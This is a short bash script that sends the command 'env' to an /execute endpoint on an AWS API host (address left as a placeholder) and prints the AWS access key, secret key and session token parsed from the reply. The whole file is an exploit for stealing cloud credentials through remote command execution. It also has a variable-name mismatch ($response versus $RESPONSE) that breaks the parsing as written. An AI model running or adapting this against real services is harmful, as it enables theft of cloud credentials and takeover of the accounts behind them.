#!/bin/bash

# Send the command to the server
response=$(curl -s -X POST https://<API GOES HERE>.amazonaws.com/execute \
-H "Content-Type: application/json" \
-d '{"command":"env"}')

# Parse and print the AWS credentials from the response
AWS_ACCESS_ID=$(echo $RESPONSE | jq -r '.AWS_ACCESS_ID')
AWS_SECRET_ACCESS_KEY=$(echo $RESPONSE | jq -r '.AWS_SECRET_ACCESS_KEY')
AWS_SESSION_TOKEN=$(echo $RESPONSE | jq -r '.AWS_SESSION_TOKEN')

echo "AWS_ACCESS_ID: $AWS_ACCESS_ID"
echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
echo "AWS_SESSION_TOKEN: $AWS_SESSION_TOKEN"
